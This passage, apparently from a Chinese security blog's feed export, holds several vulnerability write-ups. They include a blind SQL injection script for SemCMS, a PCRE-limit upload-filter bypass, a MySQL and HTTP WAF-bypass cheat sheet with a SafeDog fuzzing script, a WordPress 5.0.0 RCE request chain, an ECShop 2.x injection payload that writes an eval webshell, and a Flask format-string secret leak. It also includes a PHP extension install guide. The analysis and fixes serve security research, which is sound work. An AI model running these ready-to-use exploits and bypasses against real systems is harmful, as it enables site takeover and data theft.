鸡肋放大这里虽然无法使用select语句获取更多信息，但也不局限于database()等信息。可以通过盲注获取当前表即其查询的sc_tagandseo表内其他字段内容。因为该cms安装数据库时为自动安装，所以所有字段名都可以得到。这里以tag_newkey为例http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%201http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%20110页面返回不同证明了可以进行注入。 这里其实只是证明可以通过注入获取数据，然而从该表注入出的数据并没有什么卵用。既然绕过了其过滤函数，继续全局搜索，看看其他表是否存在类似注入，稍微搜一下，发现sc_email`sc_msg`等多个表的查询还是有类似情况的，这几个表的信息还是比较丰富的，没有继续深究，诸位可继续深入挖掘。 0x04 poc上面提到的简单exp，可供测试123456789101112131415161718192021222324252627282930313233343536373839import requests #[+]author by boogle#[+]blog: https://boogle.github.iourl = 'http://127.0.0.1/semcms_php_v3.8/?languageIDD=1'payload_len = ' and greatest(length(database()),0) like &#123;0&#125;'payload_database = '%20and%20greatest(ascii(substr(database(),&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'payload_tag = '%20and%20greatest(ascii(substr(tag_newkey,&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'#获取数据库长度for i in range(0,16): payload = url+payload_len.format(str(i)) #print payload res = requests.get(payload) if 'About Us' in res.text: print '[+] The databse length is '+str(i) length = i break# 获取数据库databse = ''for i in range(1,length+1): for j in xrange(0,128): payload = url + payload_database.format(str(i),str(j)) res = requests.get(payload) if 'About Us' in res.text: databse += chr(j) print '[+] Payloading :'+databse breakprint '[+] The databse is '+databse#获取tag_newkey字段内容tag=''for i in range(1,5): for j in xrange(0,128): payload = url + payload_tag.format(str(i),str(j)) res = requests.get(payload) if 'We main manufacturer' in res.text: tag += chr(j) print '[+] Payloading :'+tag breakprint '[+]tag_newkey '+tag 0x05 修复方案传入的int类型参数使用intval()函数强制类型转换。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass PCREWAF]]></title>
    <url>%2FBypass-PCREWAF%2F</url>
    <content type="text"><![CDATA[0x00 前言起源于CODEBREAKING中一个ctf题目 easy - pcrewaf1234567891011121314151617181920&lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo "bad request";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header("Location: $path", true, 303);&#125; 0x01 题目分析题目大意为向服务器写入一个php文件，但是文件内容收到了限制1preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data) 正则匹配了php标签，也就是说我们无法写入php代码，常规绕过思路是使用ASP标签&lt;% %&gt;或者script PHP标签&lt;script language=&quot;php&quot;&gt;来区分php代码，但是题目环境使用php7版本，这两种标签均被移除。 这里，PHITHON大神提到了一种很好的方式：PHP利用PCRE回溯次数限制绕过某些安全限制 0x02 利用pcre.backtrack_limit限制绕过pcrewaf常见正则有两种匹配形式 DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入 NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 而php所使用的pcre库则采用了NFA方式 那么何为回溯呢？这里以此题的正则为例匹配&lt;?php phpinfo();//booglewadwdadadwad1/&lt;\?.*[(`;?&gt;].*/is 当其执行到第一个.*时，它会匹配到后面所有的内容而继续执行到 [(;?&gt;]时，前面匹配的全部内容显然不符合，此时便会进行回溯。直到匹配到;时符合条件 那么这里便有一个问题，如果回溯时无关字符无限长，那么岂不是会导致正则永远无法执行完成，导致正则dos。其实为了防止这种情况的发生，pcre对回溯次数做了限制，默认配置回溯次数pcre.backtrack_limit为1000000次。当回溯次数超过一百万次时，会返回false,那么这个题目便可构造超长的回溯次数使其返回false绕过文件内容检查。 0x03 payload1234567891011121314151617import requestsfrom io import BytesIOfrom hashlib import md5file = &#123; 'file':BytesIO(b'&lt;?php phpinfo();//'+b'a'*1000000)&#125;url = 'http://192.168.111.139:8088/'r=requests.post(url=url,files=file)m = md5()m.update('192.168.111.1')path = '/data/'+m.hexdigest()for i in xrange(0,10): u = url+path+'/'+str(i)+'.php' res = requests.get(u) if res.status_code == 200: print u 0x04 修复方法题目中使用了preg_match对字符串匹配，采用===判断返回值123if(is_php($input) === 0) &#123; ...&#125;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从http协议层面和数据库层面绕过waf]]></title>
    <url>%2F%E4%BB%8Ehttp%E5%8D%8F%E8%AE%AE%E5%B1%82%E9%9D%A2%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87waf%2F</url>
    <content type="text"><![CDATA[0x01 http协议层面绕过waf此部分参考在HTTP协议层面绕过WAF、利用分块传输吊打所有WAF http管道化pipelinehttp管道化允许多个http请求通过一个套接字同时被输出 ，而不用等待相应的响应。然后请求者就会等待各自的响应，这些响应是按照之前请求的顺序依次到达。因为多个请求可被同时传送，如果waf只检测第一个请求，而忽略后面的请求，便可被绕过。下面介绍通过burpsuite同时发送多个请求首先关闭Update Content-Length然后修改Connection字段值为keep-alive,将多个请求包在数据段后面拼接即可，前面的数据包通过设置Content-Length字段，只会读取到指定的位置，剩下的数据将作为第二个请求。可以看到服务端返回了两个Response,但第二个带有and关键字被安全狗拦截，说明该方法无法绕过安全狗，但不排除绕过其他waf的可能。12补充：在进行环境测试时，发现php版本为`nts`时，服务端只会返回一个响应，原因未知。建议大家在遇到这种情况时可以更换`thread safe`版本 http分块传输通过在数据包中添加Transfer-Encoding: chunked,标示报文采用分块编码。此时会忽略Content-Length字段设置。此时数据部分为一系列分块，每个分块包含十六进制的长度值和数据，长度值与数据各占一行。最后用0标志分块结束并且最后紧跟两个换行。可以看到该方法将关键字分块传输绕过了waf。但是Imperva、360等WAF已经对Transfer-Encoding的分块传输做了处理，将分块组合成完整数据包进行分析，导致关键字被拦截。此时可以通过在分块传输的长度标识后面添加;作为注释，随机添加注释内容，便可使waf无法识别。另外对于加载在中间件上的插件ModSecurity，因为其不会解析http数据包内容，因此基于ModSecurity的waf产品用上述方法便无法绕过。但是可以通过发送畸形的分块数据包，即使分块数据块出错，例如长度值与数据不符等，将攻击语句添加在url中。此时apache会因为畸形分块数据包而报错，导致ModSecurity不会处理错误的数据包，而apache强大的容错能力继续执行了可以解析的部分。 http协议未覆盖http头中Content-Type字段一般可以设置三种参数提交形方式：application/x-www-form-urlencoded，multipart/form-data，text/plain。当waf未能覆盖multipart/form-data提交方式时，或者waf认为其为文件上传请求，从而只检测文件上传，导致waf被绕过。 http字符集编码在Content-Type中可以使用charset定义字符集，如果基于规则引擎的waf未对相应字符集进行处理，则可以被绕过burpsuite修改charset可自动encode。 0x02 数据库层面绕过waf此部分参考WAF Bypass数据库特性（Mysql探索篇）以Mysql数据库为例分析 例句形式常见有5个位置即：SELECT * FROM admin WHERE username = 1【位置一】union【位置二】select【位置三】1,user()【位置四】from【位置五】admin 通用空格替换符 注释符 /**/ /*!00000union*/ 空白符%09,%0a,%0b,%0c,%0d以上注释和空白符可用于所有位置位置一 union之前 浮点数 1.0union 1.union 等形式 科学计数法 1E0union 浮点数特殊形式 %1.union %2.union %1%2eunion \N形式 \Nunion位置二 union和select之间 ()包裹select语句位置三 select之后 特殊字符 ! + - @ ~上面字符除@外，可单个或随机自由数量组合使用 如select!~!!!-+~@1,2,3 引号 select&quot;1&quot;,2,3 \N形式 select\N,2,3 花括号形式 select{x 1},2,3位置四 from之前 浮点数 select 1,2,3.0from 或 3.from 科学计数法 select 1,2,3E0from 浮点数特殊形式 %1.from %2.from %1%2efrom \N形式 select 1,2,\Nfrom 带括号的函数 如select 1,2,user()from 破浪号 1select 1,2,3`from 破浪号后加任意字符串 1select 1,2,3`booglefrom 花括号形式 select 1,2,{x 3}from 位置五 from之后 破浪号 1select 1,2,3 from`user 破浪号包裹 1select 1,2,3 from`user` 括号()包裹 select 1,2,3 from(user) 花括号形式 select 1,2,3 from{x user} 查询同一个表的情况下，可以加任意数字字母 select * from user where id = -1 union select 1,user(),3 fromboogle123user等价函数 字符串截取函数 12345678910111213Mid(version(),1,1)Substr(version(),1,1)Substring(version(),1,1)Lpad(version(),1,1)Rpad(version(),1,1)Left(version(),1)reverse(right(reverse(version()),1)) 字符串连接函数 123concat(version(),'|',user());concat_ws('|',1,2,3) 延时注入相关函数 12345678(1) sleep(5) select * from user where id = 1 and if(left(database(),1)='g',sleep(5),1)(2) benchmark(count,expr) select * from user where id = 1 and if(left(database(),1)='t',(select benchmark(10000000,md5('boogle'))),1)(3) 计算笛卡尔积 select * from user where id = 1 and if(left(database(),1)='t',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)(4) 正则bug(受mysql版本影响，部分不可行) select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') 报错函数 12345678910111213141516171819202122232425262728293031(1) 通过floor报错,注入语句如下: and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);(2) 通过ExtractValue报错,注入语句如下: and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));(3) 通过UpdateXml报错,注入语句如下: and 1=(updatexml(1,concat(0x3a,(select user())),1))4、通过NAME_CONST报错,注入语句如下: and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c);(5) 通过join报错爆字段,注入语句如下:（在知道数据库跟表名的情况下使用才可以爆字段） select * from (select * from 表名 a join 表名 b) c) 然后得到字段 如果想在爆下一个字段 就得加上using (已知的字段） 在下一个字段 如果想在爆下一个字段 就得加上using (已知的字段,已知的字段 ） select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段 ） ) c)(6) 通过exp报错,注入语句如下: and exp(~(select * from (select user() ) a) );(7) 通过GeometryCollection()报错,注入语句如下: and geometrycollection((select * from(select * from(select user())a)b));(8) 通过polygon ()报错,注入语句如下: and polygon((select * from(select * from(select user())a)b));(9) 通过multipoint ()报错,注入语句如下: and multipoint((select * from(select * from(select user())a)b));(10) 通过multilinestring()报错,注入语句如下: and multilinestring((select * from(select * from(select user())a)b));(11) 通过multipolygon()报错,注入语句如下: and multipolygon((select * from(select * from(select user())a)b));(12) 通过linestring ()报错,注入语句如下: and multilinestring((select * from(select * from(select user())a)b)); 过滤特殊字符 123456789101112131415(1)limit处的逗号： limit 1 offset 0(2)字符串截取处的逗号 mid处的逗号： mid(version() from 1 for 1)(3)union处的逗号： 通过join拼接。SELECT * FROM admin WHERE username = 1 union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b (4)操作符&lt;&gt;被过滤select * from users where id=1 and ascii(substr(database(),0,1))&gt;64此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64总结：使用greatest()绕过比较操作符。 0x03 绕过安全狗测试狗狗为最新版经测试，狗狗拦截点为union select之间和from之后from之后可以使用破浪号或者花括号形式绕过，而union select可以使用注释符/**/方法,但是单纯的注释符会触发狗狗的拦截规则，这里对其填充字符进行fuzz1234567891011121314import requestsburp0_url = "http://127.0.0.1:80/test.php?id=-1 union/*%&#123;0&#125;%&#123;1&#125;*/select 1,password,3 from`user`"burp0_cookies = &#123;"ECS[visit_times]": "9", "__atuvc": "2%7C6", "safedog-flow-item": "83B003D84BC326490BB46CB86446460A"&#125;burp0_headers = &#123;"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"&#125;requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)for i in range(0,128): for x in range(0,100): a=burp0_url.format(str(hex(i))[2:],str(hex(x))[2:]) req = requests.get(a,headers=burp0_headers,cookies=burp0_cookies) if 'dc647eb65e6711e155375218212b3964' in req.text: print '[+]'+a print '[+]'+'%'+str(hex(i))[2:]+'%'+str(hex(x))[2:]+' '+chr(i)+' '+chr(x) 以下姿势均可以绕过]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wordpress5.0.0 远程代码执行漏洞分析]]></title>
    <url>%2Fwordpress5-0-0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言该漏洞由RIPS团队发现并公开在其Blog,在其blog中可发现该漏洞为数据覆盖+目录穿越写文件+文件包含三个漏洞组成的远程代码执行漏洞。根据其提供的漏洞细节可发现在edit_post()中未对post数据做任何过滤，导致可以传入meta_input数组并最终对数据库内容进行覆盖。这一方法在发生在对媒体文件修改属性时调用，因此需要具有author权限，在操作的媒体文件数据中_wp_attached_file字段指明了文件路径，而在对图片进行裁剪操作时，图片存放文章取决于该字段，因此可以实现目录穿越向任意目录写文件，最终可以将文件写入到主题文件进行包含的位置可实现远程代码执行。 0x01 漏洞分析数据覆盖漏洞根据RIPS提供的信息，漏洞发生在edit_post方法和update_post_meta方法中，直接跟踪到这两个方法。 12345678910function edit_post( $post_data = null ) &#123; if ( empty($postarr) ) $postarr = &amp;$_POST; ⋮ if ( ! empty( $postarr['meta_input'] ) ) &#123; foreach ( $postarr['meta_input'] as $field =&gt; $value ) &#123; update_post_meta( $post_ID, $field, $value ); &#125; &#125; 在edit_post方法中发现对post来的数据未做任何处理。而对图片属性进行修改时可直接诱发该方法 然后调用update_post_meta方法根据post_ID修改post meta field,调用wp_update_post方法更新post_data。在wp_update_post方法中会调用wp_insert_post()在wp_insert_post()方法中遍历meta_input调用update_post_meta对数据进行更新操作， 函数调用栈， 至此可覆盖数据库中_wp_attached_file内容post数据包，只需在正常修改图片属性post数据中添加&amp;meta_input[_wp_attached_file]=/test/boogle.jpg123post_wpnonce=6b7df5b262&amp;_wp_http_referer=%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit%26message%3D1&amp;user_ID=2&amp;action=editpost&amp;originalaction=editpost&amp;post_author=2&amp;post_type=attachment&amp;original_post_status=inherit&amp;referredby=http%3A%2F%2F127.0.0.1%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit&amp;_wp_original_http_referer=http%3A%2F%2F127.0.0.1%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit&amp;post_ID=7&amp;meta-box-order-nonce=39163aa91a&amp;closedpostboxesnonce=1e6416f7d7&amp;post_title=avatar&amp;samplepermalinknonce=7548fad608&amp;excerpt=123&amp;_wp_attachment_image_alt=123&amp;content=sdd&amp;attachment_url=http%3A%2F%2F127.0.0.1%2Fwordpress-5.0%2Fwp-content%2Fuploads%2F2019%2F02%2F2-4.jpg%23%2F..%2F..%2F..%2F..%2Fthemes%2Ftwentynineteen%2F32.jpg&amp;original_publish=Update&amp;save=Update&amp;advanced_view=1&amp;comment_status=open&amp;add_comment_nonce=17653878f1&amp;_ajax_fetch_list_nonce=82034e96c4&amp;_wp_http_referer=%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit%26message%3D1&amp;post_name=avatar-2&amp;meta_input[_wp_attached_file]=/test/boogle.jpg 目录穿越写文件上面我们已经能够控制_wp_attached_file的值，但这并什么带来什么实际影响，因此进行全局搜索，看看哪些地方用到了这个值，并进一步进行利用。搜索发现在get_attached_file()方法中，对该值进行了获取，最拼接在$file变量中返回 补充：在wordpress在图片裁剪时，首先会从默认目录wp-content\uploads\yyyy\mm查找，如果不存在，则会从本地服务器下载，下载url为http://127.0.0.1/wordpress/wp-content/uploads+_wp_attached_file拼接的结果，这里可以使用url获取资源的特点，如boogle.jpg?../../boo.jpg本地查找不存在而下载时又会定位到boogle.jpg，而忽略?后面的内容。另外windows目录中不允许存在?，可以使用#代替。 然后继续向上跟踪查看哪里调用了该方法。定位到wp_crop_image()方法，并且在该方法中进行了简单拼接作为文件名进行了保存，而该方法的作用为裁剪图片，即我们可以能控制裁剪操作后图片保存的位置。继续向上跟踪，在wp_ajax_crop_image()方法中对裁剪方法进行了调用跟踪到这时本来一切顺利，心思只要进行图片裁剪便会触发漏洞，然而还是水平太菜，没有触发漏洞，也没有定位到哪里调用了该方法，此处膜拜大佬。 问题出现在在进行裁剪时没有调用该裁剪方法，而需要修改数据包手动调用。在admin-ajax.php对这些方法进行了判断 最终在apply_filters()方法中，进行了动态调用 这里直接附post123POST action=crop-image&amp;_ajax_nonce=b259baa5c9&amp;postid=8&amp;history=%5B%7B%22c%22%3A%7B%22x%22%3A24%2C%22y%22%3A21%2C%22w%22%3A40%2C%22h%22%3A44%7D%7D%5D&amp;target=all&amp;context=&amp;do=save&amp;id=8&amp;cropDetails[dst_width]=8&amp;cropDetails[dst_height]=8 文件包含后面讲继续分析，这里可以参考https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A 0x02 补丁修复补丁增加了对meta_input的过滤，将其从post中移除。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows+apache+php7.0安装php扩展之imagick踩过的大坑]]></title>
    <url>%2Fwindows-apache-php7-0%E5%AE%89%E8%A3%85php%E6%89%A9%E5%B1%95%E4%B9%8Bimagick%E8%B8%A9%E8%BF%87%E7%9A%84%E5%A4%A7%E5%9D%91%2F</url>
    <content type="text"><![CDATA[0x00 前言在安装之前还特意在manual上查看了一下安装过程下载dll-&gt;copy到php扩展目录-&gt;添加配置到php.ini然而事情并没有那么简单– 0x01 踩坑之旅上述方法无效后就开始了愉快的网上冲浪环节，在前人的记录中，找到需要安装ImageMagick控件。然而安装后还是出现运行php -m还是出现了无法加载模块的错误然后又有前人记载，可能是imagemakick版本太高的原因，然后又进行降级安装，此时又爆出弹窗错误，提示无法定位到dll。其中部分环节过于血腥忘记了一部分。 0x02 正确姿势 首先下载安装ImageMagick-6.7.5-0-Q8-windows-dllhttps://ftp.icm.edu.pl/packages/ImageMagick/binaries/ 建议版本不要过高，安装时采用默认安装便会将目录添加到环境变量。 将目录下的所有 CORE_RL_*.dll复制到apache/bin目录下 下载php扩展imagickhttp://pecl.php.net/package/imagick/3.4.1/windows，按照需要选择版本 将解压后目录内的php_imagick.dll放到php扩展目录ext下 添加extension=php_imagick.dll到php.ini文件 将目录内的八个CORE_RL_*.dll文件复制到php.exe所在目录 重启apache,必要条件下需要重启计算机。查看phpinfo当$_SERVER[&#39;PATH&#39;]中不包含ImageMagick的环境变量时重启 运行php -m| findstr imagick或者php -i | findstr imagick或者phpinfo()查看是否成功0x03 成功截图 php -i| findstr imagick phpinfo]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ECShop2.x 从sql注入到代码执行]]></title>
    <url>%2FECShop2-x-%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[0x00 漏洞成因根源是user.php中模板变量可控，导致sql注入，配合注入实现任意代码执行。 0x01 漏洞分析sql注入分析首先查看漏洞触发点,这里back_act来自于REFERER，用户可控。继续往下跟，可发现back_act变量进入了assert函数，该方法用于模板变量注册。然后跟进到display方法。display用于将模板显示出来。 首先进入fech方法。在该方法中，进入到template_out方法进行模板变量解析。其中前边注册的back_act变量会解析到模板中。 最终out返回为解析变量后html页面内容，其back_act处内容用户可控。 在display方法中，继续向下执行，判断 _echash是否在out中，并以_echash对out进行分割，因为这里_echash值固定，所以这里是可控的。分隔后的内容继续进入到insert_mod方法中。继续跟进。这里函数用来处理动态内容，在最后可以看到动态函数调用，而传进来的name变量以|分隔，后半部分反序列化后作为动态函数的参数，前边部分与insert_拼接作为函数名。那么只需要继续找到可利用的函数即可。这里找到insert_ads这个函数，可以看到arr[‘id’]跟[‘num’]直接被拼接到sql语句中。而这个arr变量即为我们前边可控的反序列化得到的内容。所以这里造成sql注入。所以这里sql注入payload形式为123REFERER = _echash+ads|serialize(array('num'=&gt;sql_payload,'id'=&gt;2))REFERER = 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";s:3:"boo";&#125; 成功注入sql语句 代码执行在上面基础上我们继续往下分析。这里position_style变量取的是‘str:’与sql语句执行的内容$position_style = $row[‘position_style’];拼接结果。这部分sql执行内容是可以通过前面所分析的sql注入可控的。其被带进fetch方法，继续跟踪。因为position_style在上面与str:拼接，所以进入fetch后会进入到执行_eval函数的分支。 _eval函数中调用了eval方法 在此之前，用户可控的filename变量进入fetch_str中继续字符串过滤操作，跟进查看。 source中内容1&#123;$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//&#125;xxx 在最后preg_replace会匹配{([^}{\n]*)}在/e修饰符下执行$this-&gt;select(‘\1’);其中带入的参数即为前面正则匹配到的内容。1preg_replace("/&#123;([^\&#125;\&#123;\n]*)&#125;/e", "\$this-&gt;select('\\1');", $source); 之后会依次进入select-&gt;get_val-&gt;make_var,最终payload闭合make_var中字符串即可从变量从逃逸。首先进入select方法，要想返回内容可控，要让tag[0]==’$’，然后继续跟到get_val方法。进入到get_val后，发现当字符串中不存在.$进入make_var方法处理，继续跟进。可以看到在make_var方法中最终进行了拼接处理，只需要将前面闭合，后面注释掉即可。 在此为止，最终在fetch_str处理后的字符串格式为1&lt;?php echo $this-&gt;_var['payload'];?&gt;//这里payload只需将前面闭合即可执行任意代码 根据前面分析，进入fetch_str处理的字符串即position_style的内容为1&#123;$ads'];payload//&#125; //这里payload为想要执行的任意代码 因为position_style变量取自sql查询的position_style字段。结合前面的注入漏洞,使用union select 控制字段内容arr[id]传入‘/*’,arr[num]传入/ union select 1,2,3,4,5,6,7,8,9,10 – -即可将中间的order by 注释掉实现union select1SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= '1535678679' AND end_time &gt;= '1535678679' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- - 另外为了让程序继续执行下面的代码，这里需满足条件最终payload1REFERER:554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";&#125; 参考链接ecshop2.x 代码执行]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python格式化字符串漏洞]]></title>
    <url>%2Fpython%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 前言在python2.6之后，引入了format格式化字符串的方法，极大的扩展了%格式化字符串的形式。它甚至可以访问对象的属性和数据项，这导致字符串在用户可控的的条件下，将产生安全问题。 0x01 简单例子1234567891011secert = 'I_love_python'class User(): def __init__(self,name,password): self.name = name self.password = password user = User('boogle','l3oog1e_Password')email = '&#123;user.password&#125;,&#123;user.__class__.__init__.__globals__&#125;'info = 'Hello ,&#123;user.name&#125;'+' your email is '+emailprint info.format(user=user) 假设上面代码中email内容用户可控，使用上面构造的字符串后,发现带出来敏感数据。1Hello ,boogle your email is l3oog1e_Password,&#123;'info': 'Hello ,&#123;user.name&#125; your email is &#123;user.password&#125;,&#123;user.__class__.__init__.__globals__&#125;', 'secert': 'I_love_python', '__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'C:\\Users\\14737\\Desktop\\format.py', '__package__': None, 'email': '&#123;user.password&#125;,&#123;user.__class__.__init__.__globals__&#125;', 'User': &lt;class __main__.User at 0x02D41DC0&gt;, '__name__': '__main__', '__doc__': None, 'user': &lt;__main__.User instance at 0x02D55508&gt;&#125; 0x02 构造利用链在上面的实例中，我们带出来两种数据，一种是方法内的局部变量，一种是类外的全局变量。可以看到带出局部变量构造比较简单，而带出全局变量比较复杂，而在实际环境中带出敏感信息则更为复杂，这里介绍几个常用的方法。 bases 返回一个类直接所继承的类（元组形式 mro 也是返回一个类直接所继承的类 class 返回一个实例所属的类 globals 用于函数，返回一个当前空间下能使用的模块，方法和变量的字典 subclasses() 获取一个类的子类，返回的是一个列表 0x03 ctf题目下面使用百越杯中的一个web题目演示上面利用链的使用方法。 搭建环境题目源码：easy flask 1234567修改工作目录即文件夹名为flaskr然后启动flask application,首先设置环境变量set FLASK_APP = __init__.py //powershell命令为：$env:FLASK_APP = "__init__.py"初始化数据库flask init-db运行flask run 代码审计这里只查看格式化字符串漏洞导致信息泄露部分，全局搜索format123456789101112131415161718192021222324@bp_secert.route('/views',methods = ['GET','POST'])@login_checkdef views_info(): view_id = request.args.get('id') if not view_id: view_id = session.get('user_id') user_m = user.query.filter_by(id=view_id).first() if user_m is None: flash(u"该用户未注册") return render_template('secert/views.html') if str(session.get('user_id'))==str(view_id): secert_m = secert.query.filter_by(id=view_id).first() secert_t = u"&lt;p&gt;&#123;secert.secert&#125;&lt;p&gt;".format(secert = secert_m) else: secert_t = u"&lt;p&gt;***************************************&lt;p&gt;" name = u"&lt;h1&gt;name:&#123;user_m.username&#125;&lt;h1&gt;" email = u"&lt;h2&gt;email:&#123;user_m.email&#125;&lt;h2&gt;" info = (name+email+secert_t).format(user_m=user_m) return render_template('secert/views.html',info = info) 在view_info函数中可以看到secret_m内容首先进入到secret_r然后又带入格式化的字符串中，这里secret_m为数据库secert表内容，继续往下看，可以看到该表中内容来自用户edit页面编辑1234567891011121314151617@bp_secert.route('/edit',methods = ['GET','POST'])@login_checkdef edit_secert(): if request.method=='POST': secert_new = request.form.get('secert') error = None if not secert_new: error = u'请输入你的秘密' if error is None: secert.query.filter_by(id = session.get('user_id')).update(&#123;'secert':secert_new&#125;) db.session.commit() return redirect(url_for('secert.views_info')) flash(error) return render_template('secert/edit.html') 所以，secert_m内容可控，即最终格式化字符串的内容可控，即存在我们上面所说的问题。1info = (name+email+secert_t).format(user_m=user_m) 这里format()方法中，传入参数user_m，则前面字符串中也应为{user_m}形式，否则会报错。 构造利用链首先确定函数为user_m,向上查看。123```class user(db.Model): ....//省略类内容 在该类中没有我们想要的内容，可以看到user类继承自db.Model。那么可以使用base获取。db.Model是SQLAlchemy的实例。而db使用了current_app进行了配置12345def init_db(): db = sqlite3.connect( current_app.config['DATABASE'], detect_types=sqlite3.PARSE_DECLTYPES ) 而current_app中有用于生成用户session的SECRET_KEY，所以我们可以用这条链进行获取。1&#123;user_m.__class__.__base__.__class__.__init__.__globals__[current_app].config&#125; 获取到secret_key便可进行session伪造 利用脚本https://github.com/noraj/flask-session-cookie-manager1python3 .\session_cookie_manager.py encode -s 'test' -t "&#123;'user_id': 5&#125;"]]></content>
      <categories>
        <category>python安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ectouch2 微信支付xxe漏洞]]></title>
    <url>%2Fectouch2-%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98xxe%E6%BC%8F%E6%B4%9E%2F</url>
